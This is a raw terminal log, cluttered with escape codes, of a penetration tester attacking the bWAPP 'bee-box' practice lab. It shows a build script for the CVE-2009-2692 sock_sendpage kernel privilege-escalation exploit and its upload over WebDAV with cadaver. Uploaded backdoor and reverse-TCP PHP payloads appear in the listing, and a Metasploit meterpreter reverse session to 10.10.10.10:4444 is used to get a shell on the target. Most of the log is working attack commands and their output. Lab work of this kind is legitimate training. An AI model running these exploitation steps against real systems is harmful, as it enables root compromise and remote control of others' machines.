[m[4m[38;5;81m$OPT_FLAG[m[4m [m[4m[93m-o[m[4m pwnkernel pwnkernel.c                                      [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[36;119H3[23;5H[?25h[?25l[93m 23 [m    cc [38;5;81m$OPT_FLAG[m [93m-o[m pwnkernel pwnkernel.c                                      [1m[31m[48;5;121m [m[23;85H[K[24;1H[4m[93m 24 [m[4m  ./pwnkernel                                                                  [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[36;119H4[24;5H[?25h[?25l[93m 24 [m  ./pwnkernel                                                                  [1m[31m[48;5;121m [m[24;85H[K[25;1H[4m[93m 25 [m[4m[93melse[m[4m                                                                           [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[36;119H5[25;5H[?25h[?25l[93m 25 [m[93melse[m                                                                           [1m[31m[48;5;121m [m[25;85H[K[26;1H[4m[93m 26 [m[4m  [m[1m[4m[96mRESULT[m[4m=[m[4m[38;5;224m`/usr/sbin/getenforce`[m[4m                                                [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[36;119H6[26;5H[?25h[?25l[93m 26 [m  [1m[96mRESULT[m=[38;5;224m`/usr/sbin/getenforce`[m                                                [1m[31m[48;5;121m [m[26;85H[K[27;1H[4m[93m 27 [m[4m  [m[4m[93mif [[m[4m [m[4m[93m"[m[4m[38;5;81m$RESULT[m[4m[93m"[m[4m [m[4m[93m!=[m[4m [m[4m[93m"[m[4m[95mDisabled[m[4m[93m"[m[4m [m[4m[93m];[m[4m [m[4m[93mthen[m[4m                                         [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[36;119H7[27;5H[?25h[?25l[93m 27 [m  [93mif [[m [93m"[m[38;5;81m$RESULT[m[93m"[m [93m!=[m [93m"[m[95mDisabled[m[93m"[m [93m];[m [93mthen[m                                         [1m[31m[48;5;121m [m[27;85H[K[28;1H[4m[93m 28 [m[4m    cc [m[4m[38;5;224m-fno-stack-protector[m[4m [m[4m[38;5;81m$OPT_FLAG[m[4m [m[4m[93m-o[m[4m exploit exploit.c                     [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[36;119H8[28;5H[?25h[?25l[93m 28 [m    cc [38;5;224m-fno-stack-protector[m [38;5;81m$OPT_FLAG[m [93m-o[m exploit exploit.c                     [1m[31m[48;5;121m [m[28;85H[K[29;1H[4m[93m 29 [m[4m    [m[4m[93mcat[m[4m tzameti.avi [m[4m[93m>>[m[4m ./exploit                                               [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[36;119H9[29;5H[?25h[?25l[93m 29 [m    [93mcat[m tzameti.avi [93m>>[m ./exploit                                               [1m[31m[48;5;121m [m[29;85H[K[30;1H[4m[93m 30 [m[4m    runcon [m[4m[93m-t[m[4m initrc_t [m[4m[93m--[m[4m sh [m[4m[93m-c[m[4m ./exploit                                      [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[36;118H30[30;5H[?25h[?25l[93m 30 [m    runcon [93m-t[m initrc_t [93m--[m sh [93m-c[m ./exploit                                      [1m[31m[48;5;121m [m[30;85H[K[31;1H[4m[93m 31 [m[4m    [m[4m[93mif [[m[4m [m[4m[93m"[m[4m[38;5;81m$?[m[4m[93m"[m[4m [m[4m[93m=[m[4m [m[4m[95m"1"[m[4m [m[4m[93m];[m[4m [m[4m[93mthen[m[4m                                                    [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[36;119H1[31;5H[?25h[?25l[93m 31 [m    [93mif [[m [93m"[m[38;5;81m$?[m[93m"[m [93m=[m [95m"1"[m [93m];[m [93mthen[m                                                    [1m[31m[48;5;121m [m[31;85H[K[32;1H[4m[93m 32 [m[4m       ./exploit                                                               [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[36;119H2[32;5H[?25h[?25l[93m 32 [m       ./exploit                                                               [1m[31m[48;5;121m [m[32;85H[K[33;1H[4m[93m 33 [m[4m    [m[4m[93mfi[m[4m                                                                         [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[36;119H3[33;5H[?25h[?25l[93m 33 [m    [93mfi[m                                                                         [1m[31m[48;5;121m [m[33;85H[K[34;1H[4m[93m 34 [m[4m  [m[4m[93melse[m[4m                                                                         [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[36;119H4[34;5H[?25h[?25l[93m 34 [m  [93melse[m                                                                         [1m[31m[48;5;121m [m[34;85H[K[35;1H[4m[93m 35 [m[4m    cc [m[4m[38;5;224m-fno-stack-protector[m[4m [m[4m[38;5;224m-fPIC[m[4m [m[4m[38;5;81m$OPT_FLAG[m[4m [m[4m[38;5;224m-shared[m[4m [m[4m[93m-o[m[4m exploit.so exploit.c    [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[36;119H5[35;5H[?25h[?25l[1;35r[35;1H
+[1;36r[34;1H[93m 35 [m    cc [38;5;224m-fno-stack-protector[m [38;5;224m-fPIC[m [38;5;81m$OPT_FLAG[m [38;5;224m-shared[m [93m-o[m exploit.so exploit.c    [1m[31m[48;5;121m [m[34;85H[K[35;1H[4m[93m 36 [m[4m    cc [m[4m[38;5;81m$OPT_FLAG[m[4m [m[4m[93m-o[m[4m pwnkernel pwnkernel.c                                      [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[36;1H[K[36;118H36,1[10C20%[35;5H[?25h[?25l[1;35r[35;1H
+[1;36r[34;1H[93m 36 [m    cc [38;5;81m$OPT_FLAG[m [93m-o[m pwnkernel pwnkernel.c                                      [1m[31m[48;5;121m [m[34;85H[K[35;1H[4m[93m 37 [m[4m    ./pwnkernel                                                                [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[36;118H[K[36;118H37,1[10C40%[35;5H[?25h[?25l[1;35r[35;1H
+[1;36r[34;1H[93m 37 [m    ./pwnkernel                                                                [1m[31m[48;5;121m [m[34;85H[K[35;1H[4m[93m 38 [m[4m  [m[4m[93mfi[m[4m                                                                           [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[36;118H[K[36;118H38,1[10C60%[35;5H[?25h[?25l[1;35r[35;1H
+[1;36r[34;1H[93m 38 [m  [93mfi[m                                                                           [1m[31m[48;5;121m [m[34;85H[K[35;1H[4m[93m 39 [m[4m[93mfi[m[4m                                                                             [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[36;118H[K[36;118H39,1[10C80%[35;5H[?25h[?25l[1;35r[35;1H
+[1;36r[34;1H[93m 39 [m[93mfi[m                                                                             [1m[31m[48;5;121m [m[34;85H[K[35;1H[4m[93m 40 [m[4m[93mmv[m[4m [m[4m[38;5;224m-f[m[4m pwnkernel2.c pwnkernel.c                                                 [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[36;118H[K[36;118H40,1[10CBot[35;5H[?25h[?25l[34;1H[4m[93m 39 [m[4m[93mfi[m[4m                                                                             [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[35;1H[93m 40 [m[93mmv[m [38;5;224m-f[m pwnkernel2.c pwnkernel.c                                                 [1m[31m[48;5;121m [m[35;85H[K[36;118H39[34;5H[?25h[?25l[33;1H[4m[93m 38 [m[4m  [m[4m[93mfi[m[4m                                                                           [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[34;1H[93m 39 [m[93mfi[m                                                                             [1m[31m[48;5;121m [m[34;85H[K[36;119H8[33;5H[?25h[?25l[32;1H[4m[93m 37 [m[4m    ./pwnkernel                                                                [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[33;1H[93m 38 [m  [93mfi[m                                                                           [1m[31m[48;5;121m [m[33;85H[K[36;119H7[32;5H[?25h[?25l[31;1H[4m[93m 36 [m[4m    cc [m[4m[38;5;81m$OPT_FLAG[m[4m [m[4m[93m-o[m[4m pwnkernel pwnkernel.c                                      [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[32;1H[93m 37 [m    ./pwnkernel                                                                [1m[31m[48;5;121m [m[32;85H[K[36;119H6[31;5H[?25h[36;1H[?2004l[23;2t[23;1t[36;118H[K[36;1H[?2004l[?1l>[>4;m[?1049l[23;0;0t]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage/cve-2009-2692[01;31mdinesh@evil[00m: [[01;34mcve-2009-2692[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage/cve-2009-2692[01;31mdinesh@evil[00m: [[01;34mcve-2009-2692[00m] $ ll
+total 20
+-rw-r--r-- 1 dinesh dinesh  1208 Apr 23  2014 cve-2009-2692.sh
+-rw-r--r-- 1 dinesh dinesh 11119 May  5  2014 exploit.c
+-rw-r--r-- 1 dinesh dinesh   764 Apr 23  2014 pwnkernel.c
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage/cve-2009-2692[01;31mdinesh@evil[00m: [[01;34mcve-2009-2692[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage/cve-2009-2692[01;31mdinesh@evil[00m: [[01;34mcve-2009-2692[00m] $ ll
+total 20
+-rw-r--r-- 1 dinesh dinesh  1208 Apr 23  2014 cve-2009-2692.sh
+-rw-r--r-- 1 dinesh dinesh 11119 May  5  2014 exploit.c
+-rw-r--r-- 1 dinesh dinesh   764 Apr 23  2014 pwnkernel.c
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage/cve-2009-2692[01;31mdinesh@evil[00m: [[01;34mcve-2009-2692[00m] $ cd ..
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ ll
+total 180
+-rw-r--r-- 1 dinesh dinesh   184 Aug 17 17:48 01.session
+-rw-r--r-- 1 dinesh dinesh 65536 Aug 17 17:49 01.session.data
+-rw-r--r-- 1 dinesh dinesh    99 Aug 17 17:49 01.session.properties
+-rw-r--r-- 1 dinesh dinesh  6946 Aug 17 17:49 01.session.script
+drwxr-xr-x 2 dinesh dinesh  4096 Aug 18 18:45 [0m[01;34mcve-2009-2692[0m
+-rw-r--r-- 1 dinesh dinesh 20480 Aug 18 18:45 [01;31mcve-2009-2692.tar[0m
+-rw-r--r-- 1 dinesh dinesh  1112 Aug 18 18:37 reverse_tcp_payload.php
+-rw-r--r-- 1 dinesh dinesh 65536 Aug 18 18:45 terminal-log_Tue_18_Aug_2020_06:35:33_PM_IST.dmp
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ cadaver https://10.10.10.6/webdav/
+WARNING: Untrusted server certificate presented for `bee-box.bwapp.local':
+Certificate was issued to hostname `bee-box.bwapp.local' rather than `10.10.10.6'
+This connection could have been intercepted.
+Issued to: IT, MME, Menen, Flanders, BE
+Issued by: IT, MME, Menen, Flanders, BE
+Certificate is valid from Sun, 14 Apr 2013 18:11:32 GMT to Fri, 13 Apr 2018 18:11:32 GMT
+Do you wish to accept the certificate? (y/n) y
+dav:/webdav/> put cve-2009-2692
+cve-2009-2692/     cve-2009-2692.tar  
+dav:/webdav/> put cve-2009-2692.tar 
+Uploading cve-2009-2692.tar to `/webdav/cve-2009-2692.tar':
+Progress: [                              ]   0.0% of 20480 bytesProgress: [=============================>] 100.0% of 20480 bytes succeeded.
+dav:/webdav/> [H[2Jdav:/webdav/> ls
+Listing collection `/webdav/': succeeded.
+        Iron_Man.pdf                      543803  Nov  3  2014
+        Terminator_Salvation.pdf          462949  Nov  3  2014
+        The_Amazing_Spider-Man.pdf        544600  Nov  3  2014
+        The_Cabin_in_the_Woods.pdf        526187  Nov  3  2014
+        The_Dark_Knight_Rises.pdf         756522  Nov  3  2014
+        The_Incredible_Hulk.pdf           618117  Nov  3  2014
+        bWAPP_intro.pdf                  5010042  Nov  3  2014
+        backdoor.php                         136  Aug 18 16:50
+        cve-2009-2692.tar                  20480  Aug 18 18:46
+        msf_http_put_test.txt                 13  Aug 18 17:05
+        nc_traffic                           690  Aug 18 03:03
+        payload.php                         3024  Aug 18 18:12
+        payload2.php                        1112  Aug 18 18:29
+        qwerty.php                           162  Aug 18 16:47
+        reverse_tcp_payload.php             1112  Aug 18 18:38
+dav:/webdav/> [H[2Jdav:/webdav/> help 
+Available commands: 
+ ls         cd         pwd        put        get        mget       mput       
+ edit       less       mkcol      cat        delete     rmcol      copy       
+ move       lock       unlock     discover   steal      showlocks  version    
+ checkin    checkout   uncheckout history    label      propnames  chexec     
+ propget    propdel    propset    search     set        open       close      
+ echo       quit       unset      lcd        lls        lpwd       logout     
+ help       describe   about      
+Aliases: rm=delete, mkdir=mkcol, mv=move, cp=copy, more=less, quit=exit=bye
+dav:/webdav/> ^CTerminated by signal 2.
+Connection to `10.10.10.6' closed.
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ fcadaver https://10.10.10.6/webdav/ll[Kcadaver https://10.10.10.6/webdav/f[K[H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ f[Kfg
+msfconsole -q
+
+
+[0m[4mmsf5[0m exploit([1m[31mlinux/local/sock_sendpage[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mlinux/local/sock_sendpage[0m) [0m> ll
+[0m[1m[31m[-][0m Unknown command: ll.
+[4mmsf5[0m exploit([1m[31mlinux/local/sock_sendpage[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mlinux/local/sock_sendpage[0m) [0m> sessions 
+[0m
+Active sessions
+===============
+
+  Id  Name  Type                   Information              Connection
+  --  ----  ----                   -----------              ----------
+  1         meterpreter php/linux  www-data (33) @ bee-box  10.10.10.10:4444 -> 10.10.10.6:46897 (10.10.10.6)
+
+[4mmsf5[0m exploit([1m[31mlinux/local/sock_sendpage[0m) [0m> sessions -i 1
+[0m[1m[34m[*][0m Starting interaction with 1...
+
+[4mmeterpreter[0m > [H[2J[4mmeterpreter[0m > shell 
+[0mProcess 16298 created.
+Channel 5 created.
+
+cd    pwd
+/var/www/bWAPP/documents
+cd ../W	 w	 
+pwd
+/var/www/bWAPP
+ls
+666
+admin
+aim.php
+apps
+ba_captcha_bypass.php
+ba_forgotten.php
+ba_insecure_login.php
+ba_insecure_login_1.php
+ba_insecure_login_2.php
+ba_insecure_login_3.php
+ba_logout.php
+ba_logout_1.php
+ba_pwd_attacks.php
+ba_pwd_attacks_1.php
+ba_pwd_attacks_2.php
+ba_pwd_attacks_3.php
+ba_pwd_attacks_4.php
+ba_weak_pwd.php
+backdoor.php
+bof_1.php
+bof_2.php
+bugs.txt
+captcha.php
+captcha_box.php
+clickjacking.php
+commandi.php
+commandi_blind.php
+config.inc
+config.inc.php
+connect.php
+connect_i.php
+credits.php
+cs_validation.php
+csrf_1.php
+csrf_2.php
+csrf_3.php
+db
+directory_traversal_1.php
+directory_traversal_2.php
+documents
+fonts
+functions_external.php
+heartbleed.php
+hostheader_1.php
+hostheader_2.php
+hpp-1.php
+hpp-2.php
+hpp-3.php
+htmli_current_url.php
+htmli_get.php
+htmli_post.php
+htmli_stored.php
+http_response_splitting.php
+http_verb_tampering.php
+iframei.php
+images
+index.php
+info.php
+info_install.php
+information_disclosure_1.php
+information_disclosure_2.php
+information_disclosure_3.php
+information_disclosure_4.php
+insecure_crypt_storage_1.php
+insecure_crypt_storage_2.php
+insecure_crypt_storage_3.php
+insecure_direct_object_ref_1.php
+insecure_direct_object_ref_2.php
+insecure_direct_object_ref_3.php
+insecure_iframe.php
+install.php
+insuff_transp_layer_protect_1.php
+insuff_transp_layer_protect_2.php
+insuff_transp_layer_protect_3.php
+insuff_transp_layer_protect_4.php
+js
+lang_en.php
+lang_fr.php
+lang_nl.php
+ldap_connect.php
+ldapi.php
+lfi_sqlitemanager.php
+login.php
+logout.php
+logs
+maili.php
+manual_interv.php
+message.txt
+password_change.php
+passwords
+php_cgi.php
+php_eval.php
+phpi.php
+phpi_sqlitemanager.php
+phpinfo.php
+portal.bak
+portal.php
+portal.zip
+reset.php
+restrict_device_access.php
+restrict_folder_access.php
+rlfi.php
+robots.txt
+secret-cors-1.php
+secret-cors-2.php
+secret-cors-3.php
+secret.php
+secret_change.php
+secret_html.php
+security.php
+security_level_check.php
+security_level_set.php
+selections.php
+shellshock.php
+shellshock.sh
+sm_cors.php
+sm_cross_domain_policy.php
+sm_dos_1.php
+sm_dos_2.php
+sm_dos_3.php
+sm_dos_4.php
+sm_ftp.php
+sm_local_priv_esc_1.php
+sm_local_priv_esc_2.php
+sm_mitm_1.php
+sm_mitm_2.php
+sm_obu_files.php
+sm_robots.php
+sm_samba.php
+sm_snmp.php
+sm_webdav.php
+sm_xst.php
+smgmt_admin_portal.php
+smgmt_cookies_httponly.php
+smgmt_cookies_secure.php
+smgmt_sessionid_url.php
+smgmt_strong_sessions.php
+soap
+sqli_1.php
+sqli_10-1.php
+sqli_10-2.php
+sqli_11.php
+sqli_12.php
+sqli_13-ps.php
+sqli_13.php
+sqli_14.php
+sqli_15.php
+sqli_16.php
+sqli_17.php
+sqli_2-ps.php
+sqli_2.php
+sqli_3.php
+sqli_4.php
+sqli_5.php
+sqli_6.php
+sqli_7.php
+sqli_8-1.php
+sqli_8-2.php
+sqli_9.php
+sqli_drupal.php
+ssii.php
+ssrf.php
+stylesheets
+test.php
+top_security.php
+training.php
+training_install.php
+unrestricted_file_upload.php
+unvalidated_redir_fwd_1.php
+unvalidated_redir_fwd_2.php
+user_activation.php
+user_extra.php
+user_new.php
+web.config
+ws_soap.php
+xmli_1.php
+xmli_2.php
+xss_ajax_1-1.php
+xss_ajax_1-2.php
+xss_ajax_2-1.php
+xss_ajax_2-2.php
+xss_back_button.php
+xss_custom_header.php
+xss_eval.php
+xss_get.php
+xss_href-1.php
+xss_href-2.php
+xss_href-3.php
+xss_json.php
+xss_login.php
+xss_php_self.php
+xss_phpmyadmin.php
+xss_post.php
+xss_referer.php
+xss_sqlitemanager.php
+xss_stored_1.php
+xss_stored_2.php
+xss_stored_3.php
+xss_stored_4.php
+xss_user_agent.php
+xxe-1.php
+xxe-2.php
+lsd  -l 
+total 1552
+-rw-rw-r-- 1 root www-data   112 Nov  2  2014 666
+drwxrwxr-x 2 root www-data  4096 Nov  2  2014 admin
+-rw-rw-r-- 1 root www-data  2093 Nov  2  2014 aim.php
+drwxrwxr-x 2 root www-data  4096 Nov  2  2014 apps
+-rw-rw-r-- 1 root www-data  6623 Nov  2  2014 ba_captcha_bypass.php
+-rw-rw-r-- 1 root www-data 10033 Nov  2  2014 ba_forgotten.php
+-rw-rw-r-- 1 root www-data  1208 Nov  2  2014 ba_insecure_login.php
+-rw-rw-r-- 1 root www-data  7551 Nov  2  2014 ba_insecure_login_1.php
+-rw-rw-r-- 1 root www-data  9338 Nov  2  2014 ba_insecure_login_2.php
+-rw-rw-r-- 1 root www-data  7471 Nov  2  2014 ba_insecure_login_3.php
+-rw-rw-r-- 1 root www-data  4848 Nov  2  2014 ba_logout.php
+-rw-rw-r-- 1 root www-data  1737 Nov  2  2014 ba_logout_1.php
+-rw-rw-r-- 1 root www-data  1200 Nov  2  2014 ba_pwd_attacks.php
+-rw-rw-r-- 1 root www-data  7524 Nov  2  2014 ba_pwd_attacks_1.php
+-rw-rw-r-- 1 root www-data  7914 Nov  2  2014 ba_pwd_attacks_2.php
+-rw-rw-r-- 1 root www-data  8212 Nov  2  2014 ba_pwd_attacks_3.php
+-rw-rw-r-- 1 root www-data  8039 Nov  2  2014 ba_pwd_attacks_4.php
+-rw-rw-r-- 1 root www-data  5894 Nov  2  2014 ba_weak_pwd.php
+-rw-rw-r-- 1 root www-data   732 Nov  2  2014 backdoor.php
+-rw-rw-r-- 1 root www-data  5907 Nov  2  2014 bof_1.php
+-rw-rw-r-- 1 root www-data  4804 Nov  2  2014 bof_2.php
+-rw-rw-r-- 1 root www-data  7858 Nov  2  2014 bugs.txt
+-rw-rw-r-- 1 root www-data  1821 Nov  2  2014 captcha.php
+-rw-rw-r-- 1 root www-data  1101 Nov  2  2014 captcha_box.php
+-rw-rw-r-- 1 root www-data  5941 Nov  2  2014 clickjacking.php
+-rw-rw-r-- 1 root www-data  5584 Nov  2  2014 commandi.php
+-rw-rw-r-- 1 root www-data  6133 Nov  2  2014 commandi_blind.php
+-rw-rw-r-- 1 root www-data   780 Nov  2  2014 config.inc
+-rw-rw-r-- 1 root www-data   963 Nov  2  2014 config.inc.php
+-rw-rw-r-- 1 root www-data  1303 Nov  2  2014 connect.php
+-rw-rw-r-- 1 root www-data  1027 Nov  2  2014 connect_i.php
+-rw-rw-r-- 1 root www-data  5897 Nov  2  2014 credits.php
+-rw-rw-r-- 1 root www-data 10065 Nov  2  2014 cs_validation.php
+-rw-rw-r-- 1 root www-data  9206 Nov  2  2014 csrf_1.php
+-rw-rw-r-- 1 root www-data  6173 Nov  2  2014 csrf_2.php
+-rw-rw-r-- 1 root www-data  8434 Nov  2  2014 csrf_3.php
+drwxrwxr-x 2 root www-data  4096 Nov  2  2014 db
+-rw-rw-r-- 1 root www-data  9026 Nov  2  2014 directory_traversal_1.php
+-rw-rw-r-- 1 root www-data  8975 Nov  2  2014 directory_traversal_2.php
+drwxrwxrwx 2 root www-data  4096 Aug 18 15:16 documents
+drwxrwxr-x 2 root www-data  4096 Nov  2  2014 fonts
+-rw-rw-r-- 1 root www-data 15526 Nov  2  2014 functions_external.php
+-rw-rw-r-- 1 root www-data  4760 Nov  2  2014 heartbleed.php
+-rw-rw-r-- 1 root www-data  5306 Nov  2  2014 hostheader_1.php
+-rw-rw-r-- 1 root www-data  8193 Nov  2  2014 hostheader_2.php
+-rw-rw-r-- 1 root www-data  4805 Nov  2  2014 hpp-1.php
+-rw-rw-r-- 1 root www-data  6933 Nov  2  2014 hpp-2.php
+-rw-rw-r-- 1 root www-data  5931 Nov  2  2014 hpp-3.php
+-rw-rw-r-- 1 root www-data  5562 Nov  2  2014 htmli_current_url.php
+-rw-rw-r-- 1 root www-data  6164 Nov  2  2014 htmli_get.php
+-rw-rw-r-- 1 root www-data  6244 Nov  2  2014 htmli_post.php
+-rw-rw-r-- 1 root www-data  9028 Nov  2  2014 htmli_stored.php
+-rw-rw-r-- 1 root www-data  5404 Nov  2  2014 http_response_splitting.php
+-rw-rw-r-- 1 root www-data  9107 Nov  2  2014 http_verb_tampering.php
+-rw-rw-r-- 1 root www-data  5558 Nov  2  2014 iframei.php
+drwxrwxrwx 2 root www-data  4096 Nov  2  2014 images
+-rw-rw-r-- 1 root www-data   690 Nov  2  2014 index.php
+-rw-rw-r-- 1 root www-data  4079 Nov  2  2014 info.php
+-rw-rw-r-- 1 root www-data  4028 Nov  2  2014 info_install.php
+-rw-rw-r-- 1 root www-data  5285 Nov  2  2014 information_disclosure_1.php
+-rw-rw-r-- 1 root www-data  5412 Nov  2  2014 information_disclosure_2.php
+-rw-rw-r-- 1 root www-data  6911 Nov  2  2014 information_disclosure_3.php
+-rw-rw-r-- 1 root www-data  5425 Nov  2  2014 information_disclosure_4.php
+-rw-rw-r-- 1 root www-data  5299 Nov  2  2014 insecure_crypt_storage_1.php
+-rw-rw-r-- 1 root www-data  7593 Nov  2  2014 insecure_crypt_storage_2.php
+-rw-rw-r-- 1 root www-data  5176 Nov  2  2014 insecure_crypt_storage_3.php
+-rw-rw-r-- 1 root www-data  8515 Nov  2  2014 insecure_direct_object_ref_1.php
+-rw-rw-r-- 1 root www-data  6064 Nov  2  2014 insecure_direct_object_ref_2.php
+-rw-rw-r-- 1 root www-data  5285 Nov  2  2014 insecure_direct_object_ref_3.php
+-rw-rw-r-- 1 root www-data  4824 Nov  2  2014 insecure_iframe.php
+-rw-rw-r-- 1 root www-data  9671 Nov  2  2014 install.php
+-rw-rw-r-- 1 root www-data  5824 Nov  2  2014 insuff_transp_layer_protect_1.php
+-rw-rw-r-- 1 root www-data  4860 Nov  2  2014 insuff_transp_layer_protect_2.php
+-rw-rw-r-- 1 root www-data  4879 Nov  2  2014 insuff_transp_layer_protect_3.php
+-rw-rw-r-- 1 root www-data  4870 Nov  2  2014 insuff_transp_layer_protect_4.php
+drwxrwxr-x 2 root www-data  4096 Nov  2  2014 js
+-rw-rw-r-- 1 root www-data    61 Nov  2  2014 lang_en.php
+-rw-rw-r-- 1 root www-data    65 Nov  2  2014 lang_fr.php
+-rw-rw-r-- 1 root www-data    62 Nov  2  2014 lang_nl.php
+-rw-rw-r-- 1 root www-data 11096 Nov  2  2014 ldap_connect.php
+-rw-rw-r-- 1 root www-data 11713 Nov  2  2014 ldapi.php
+-rw-rw-r-- 1 root www-data  4831 Nov  2  2014 lfi_sqlitemanager.php
+-rw-rw-r-- 1 root www-data  6920 Nov  2  2014 login.php
+-rw-rw-r-- 1 root www-data  1216 Nov  2  2014 logout.php
+drwxrwxrwx 2 root www-data  4096 Nov  2  2014 logs
+-rw-rw-r-- 1 root www-data  7618 Nov  2  2014 maili.php
+-rw-rw-r-- 1 root www-data  5473 Nov  2  2014 manual_interv.php
+-rw-rw-r-- 1 root www-data    28 Nov  2  2014 message.txt
+-rw-rw-r-- 1 root www-data  8284 Nov  2  2014 password_change.php
+drwxrwxrwx 2 root www-data  4096 Nov  2  2014 passwords
+-rw-rw-r-- 1 root www-data  4825 Nov  2  2014 php_cgi.php
+-rw-rw-r-- 1 root www-data  4579 Nov  2  2014 php_eval.php
+-rw-rw-r-- 1 root www-data  5044 Nov  2  2014 phpi.php
+-rw-rw-r-- 1 root www-data  4805 Nov  2  2014 phpi_sqlitemanager.php
+-rw-rw-r-- 1 root www-data   645 Nov  2  2014 phpinfo.php
+-rw-rw-r-- 1 root www-data  6594 Nov  2  2014 portal.bak
+-rw-rw-r-- 1 root www-data  6594 Nov  2  2014 portal.php
+-rw-rw-r-- 1 root www-data  5396 Nov  2  2014 portal.zip
+-rw-rw-r-- 1 root www-data 13403 Nov  2  2014 reset.php
+-rw-rw-r-- 1 root www-data  6337 Nov  2  2014 restrict_device_access.php
+-rw-rw-r-- 1 root www-data  8345 Nov  2  2014 restrict_folder_access.php
+-rw-rw-r-- 1 root www-data  6402 Nov  2  2014 rlfi.php
+-rw-rw-r-- 1 root www-data   167 Nov  2  2014 robots.txt
+-rw-rw-r-- 1 root www-data   774 Nov  2  2014 secret-cors-1.php
+-rw-rw-r-- 1 root www-data   970 Nov  2  2014 secret-cors-2.php
+-rw-rw-r-- 1 root www-data   717 Nov  2  2014 secret-cors-3.php
+-rw-rw-r-- 1 root www-data  1100 Nov  2  2014 secret.php
+-rw-rw-r-- 1 root www-data  6688 Nov  2  2014 secret_change.php
+-rw-rw-r-- 1 root www-data  4894 Nov  2  2014 secret_html.php
+-rw-rw-r-- 1 root www-data  1277 Nov  2  2014 security.php
+-rw-rw-r-- 1 root www-data  1138 Nov  2  2014 security_level_check.php
+-rw-rw-r-- 1 root www-data  6114 Nov  2  2014 security_level_set.php
+-rw-rw-r-- 1 root www-data  2560 Nov  2  2014 selections.php
+-rw-rw-r-- 1 root www-data  4823 Nov  2  2014 shellshock.php
+-rw-rw-r-- 1 root www-data   404 Nov  2  2014 shellshock.sh
+-rw-rw-r-- 1 root www-data  5492 Nov  2  2014 sm_cors.php
+-rw-rw-r-- 1 root www-data  5870 Nov  2  2014 sm_cross_domain_policy.php
+-rw-rw-r-- 1 root www-data  4692 Nov  2  2014 sm_dos_1.php
+-rw-rw-r-- 1 root www-data  6932 Nov  2  2014 sm_dos_2.php
+-rw-rw-r-- 1 root www-data  4885 Nov  2  2014 sm_dos_3.php
+-rw-rw-r-- 1 root www-data  4709 Nov  2  2014 sm_dos_4.php
+-rw-rw-r-- 1 root www-data  4682 Nov  2  2014 sm_ftp.php
+-rw-rw-r-- 1 root www-data  5051 Nov  2  2014 sm_local_priv_esc_1.php
+-rw-rw-r-- 1 root www-data  4959 Nov  2  2014 sm_local_priv_esc_2.php
+-rw-rw-r-- 1 root www-data  6160 Nov  2  2014 sm_mitm_1.php
+-rw-rw-r-- 1 root www-data  6484 Nov  2  2014 sm_mitm_2.php
